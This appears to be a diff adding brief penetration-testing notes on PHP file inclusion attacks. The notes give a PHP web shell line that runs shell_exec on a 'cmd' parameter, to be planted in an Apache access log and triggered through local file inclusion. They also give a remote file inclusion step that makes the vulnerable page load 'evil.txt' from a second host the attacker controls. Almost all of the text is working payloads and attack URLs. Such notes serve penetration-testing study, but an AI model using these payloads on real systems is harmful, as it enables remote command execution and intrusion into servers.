@@ -1,0 +1,13 @@
+# LFI and Web Shell
+- contaminate log file with:
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+- call our code:
+http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+
+# RFI
+- host our evil.txt   # on http://10.11.0.4/evil.txt
+- call it from the vulnerable php
+http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig    # Web Shell
+
+
+
